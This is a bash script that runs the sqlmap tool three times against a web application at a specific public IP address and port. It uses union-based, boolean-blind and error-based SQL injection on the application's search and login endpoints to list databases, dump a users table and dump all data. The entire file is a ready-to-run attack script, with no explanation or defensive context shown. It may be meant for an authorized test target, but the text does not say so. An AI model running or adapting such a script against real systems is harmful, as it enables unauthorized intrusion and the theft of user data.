#!/bin/bash

echo "Running Union-based SQL Injection attack..."
python3 sqlmap.py -u "http://3.144.240.191:5000/search?name=test" --technique=U --dbs --dump --batch -v 3

echo "Running Boolean-based Blind SQL Injection attack..."
python3 sqlmap.py -u "http://3.144.240.191:5000/login?username=admin&password=test" --technique=B -D userdata -T users --dump --batch -v 2

echo "Running Error-based SQL Injection attack..."
python3 sqlmap.py -u "http://3.144.240.191:5000/login?username=admin&password=test" --technique=E --dump-all --batch

echo "All attacks completed."
